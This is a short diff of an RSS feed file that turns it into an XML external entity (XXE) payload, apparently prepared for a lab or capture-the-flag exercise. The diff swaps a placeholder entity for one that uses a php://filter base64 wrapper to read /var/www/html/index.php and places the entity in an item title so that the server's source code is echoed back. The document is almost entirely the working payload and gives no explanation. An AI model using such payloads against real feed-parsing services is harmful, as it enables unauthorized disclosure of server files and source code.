@@ -1,5 +1,5 @@
 <!DOCTYPE channel [
-  <!ENTITY file SYSTEM "file://...">
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
 ]>
 <rss version="2.0">
   <channel>
@@ -15,7 +15,7 @@
     </item>
 
     <item>
-      <title>&file;</title>
+      <title>&xxe;</title>
       <link>https://oxide.computer/blog/our-100m-series-b</link>
       <description>Our $100M Series B announcement</description>
       <pubDate>Wed, 30 Jul 2025 13:17:28 +0000</pubDate>
